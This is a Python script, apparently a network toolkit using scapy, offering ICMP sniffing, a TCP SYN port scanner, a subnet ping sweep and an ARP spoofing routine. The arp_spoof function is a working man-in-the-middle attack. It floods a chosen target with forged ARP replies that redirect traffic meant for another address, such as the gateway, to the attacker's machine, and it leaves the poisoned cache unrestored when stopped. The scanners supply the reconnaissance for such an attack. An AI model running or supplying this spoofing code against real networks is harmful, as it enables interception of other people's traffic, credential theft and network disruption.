import sys
import psutil
from scapy.all import sniff, Ether, IP, ICMP, ARP, send, sr1, TCP, get_if_hwaddr
import socket
from ipaddress import ip_network


def list_interfaces():
    """List available network interfaces with human-readable names and return a list of them."""
    print("Available Network Interfaces:")
    interfaces = psutil.net_if_addrs()
    if not interfaces:
        print("[!] No network interfaces found.")
        sys.exit(1)

    readable_interfaces = []
    for i, (iface_name, iface_details) in enumerate(interfaces.items()):
        mac_addr = "Unknown MAC"
        for detail in iface_details:
            # Check for MAC (AF_LINK on Unix-like, might be similar on others)
            if detail.family == psutil.AF_LINK:
                mac_addr = detail.address
                break

        print(f"{i+1}. {iface_name} (MAC: {mac_addr})")
        readable_interfaces.append(iface_name)

    return readable_interfaces


def sniff_icmp(interface):
    """Sniff and filter ICMP packets on the given interface."""
    def icmp_packet_handler(packet):
        if Ether in packet and IP in packet and ICMP in packet:
            eth_layer = packet[Ether]
            ip_layer = packet[IP]
            src_mac = eth_layer.src
            dst_mac = eth_layer.dst
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst

            print("=== ICMP Packet ===")
            print(f"Ethernet: src={src_mac}, dst={dst_mac}")
            print(f"IP:       src={src_ip}, dst={dst_ip}")
            print(f"ICMP Type: {packet[ICMP].type}")
            print("===================")

    try:
        print(f"[*] Sniffing ICMP packets on interface: {interface}")
        print("Press Ctrl+C to stop.")
        sniff(iface=interface, filter="icmp", prn=icmp_packet_handler, store=False)
        print("[*] ICMP sniffing completed.")
    except KeyboardInterrupt:
        print("\n[+] Stopped ICMP sniffing.")
    except Exception as e:
        print(f"[!] Error during ICMP sniffing: {e}")


def scan_ports(target, ports_to_scan):
    """Scan TCP ports on the target IP sequentially."""
    print(f"[*] Scanning {target} for open ports...")

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print("[!] Could not resolve hostname.")
        return

    if ports_to_scan == "all":
        ports_to_scan = range(1, 65536)

    for port in ports_to_scan:
        try:
            pkt = IP(dst=target_ip)/TCP(dport=port, flags='S')
            resp = sr1(pkt, timeout=0.5, verbose=0)
            if resp and TCP in resp and resp[TCP].flags == 0x12:
                print(f"[+] Open port: {port}")
                # Send RST to close the connection politely
                send(IP(dst=target_ip)/TCP(dport=port, flags='R'), verbose=0)
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")

    print("[*] Finished scanning ports.")


def arp_spoof(target_ip, spoof_ip, interface):
    """Perform ARP spoofing by sending fake ARP replies to the target."""
    try:
        # Resolve MAC address of the target
        ans = sr1(ARP(pdst=target_ip), timeout=2, verbose=0)
        if ans is None:
            print("[!] Failed to resolve target MAC address. Host might be down or unreachable.")
            return
        target_mac = ans[ARP].hwsrc

        # Resolve MAC address of our interface (attacker MAC)
        attacker_mac = get_if_hwaddr(interface)

        print(f"[*] Starting ARP spoofing: Telling {target_ip} that {spoof_ip} is at our MAC ({attacker_mac})")
        print("Press Ctrl+C to stop.")
        while True:
            # Send ARP reply to the target
            send(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=spoof_ip,
                                           hwdst=target_mac, hwsrc=attacker_mac),
                 verbose=0)
    except KeyboardInterrupt:
        print("\n[+] Stopped ARP spoofing.")
    except Exception as e:
        print(f"[!] Error during ARP spoofing: {e}")
    print("[*] ARP spoofing completed.")


def scan_network(interface):
    """Scan the network for active IPs by sending ICMP requests."""
    print("[*] Scanning the network for active IPs...")

    try:
        interface_details = psutil.net_if_addrs().get(interface)
        if not interface_details:
            raise ValueError(f"Interface {interface} not found or has no valid IP configuration.")

        local_ip = None
        subnet_mask = None
        for detail in interface_details:
            if detail.family == socket.AF_INET:
                local_ip = detail.address
                subnet_mask = detail.netmask
                break

        if not local_ip or not subnet_mask:
            raise ValueError(f"Interface {interface} does not have a valid IPv4 address or subnet mask.")

        # Calculate CIDR from subnet mask
        cidr = sum([bin(int(x)).count('1') for x in subnet_mask.split('.')])
        network = ip_network(f"{local_ip}/{cidr}", strict=False)

        print(f"[*] Scanning network: {network}")
        for ip in network.hosts():
            pkt = IP(dst=str(ip))/ICMP()
            resp = sr1(pkt, timeout=1, verbose=0)
            if resp is not None and IP in resp:
                print(f"[+] Host is up: {ip}")

    except ValueError as ve:
        print(f"[!] {ve}")
    except Exception as e:
        print(f"[!] Error during network scan: {e}")

    print("[*] Network scan completed.")


if __name__ == "__main__":
    try:
        interfaces = list_interfaces()

        print("\nWhat do you want to do?")
        print("1. Filter ICMP")
        print("2. Scan open ports")
        print("3. Spoofing program (ARP spoof)")
        print("4. Scan all IPs available and up in the network")

        choice = input("Enter your choice (1/2/3/4): ").strip()

        if choice == '1':
            interface_index = input("Enter interface number from the list above: ").strip()
            try:
                interface = interfaces[int(interface_index) - 1]
            except (IndexError, ValueError):
                print("[!] Invalid interface selection.")
                sys.exit(1)
            sniff_icmp(interface)

        elif choice == '2':
            target = input("Enter target host/IP: ").strip()
            ports_input = input("Enter comma-separated ports to scan (e.g. 22,80,443) or 'all': ").strip()

            if ports_input.lower() == "all":
                ports_to_scan = "all"
            else:
                try:
                    ports_to_scan = [int(p.strip()) for p in ports_input.split(',') if p.strip().isdigit()]
                except ValueError:
                    print("[!] Invalid ports list.")
                    sys.exit(1)

            if not ports_to_scan and ports_to_scan != "all":
                print("[!] No valid ports provided.")
                sys.exit(1)

            scan_ports(target, ports_to_scan)

        elif choice == '3':
            interface_index = input("Enter interface number from the list above: ").strip()
            try:
                interface = interfaces[int(interface_index) - 1]
            except (IndexError, ValueError):
                print("[!] Invalid interface selection.")
                sys.exit(1)
            target_ip = input("Enter target IP: ").strip()
            spoof_ip = input("Enter IP to spoof (e.g., gateway IP): ").strip()
            arp_spoof(target_ip, spoof_ip, interface)

        elif choice == '4':
            interface_index = input("Enter interface number from the list above: ").strip()
            try:
                interface = interfaces[int(interface_index) - 1]
            except (IndexError, ValueError):
                print("[!] Invalid interface selection.")
                sys.exit(1)
            scan_network(interface)

        else:
            print("[!] Invalid choice. Exiting.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
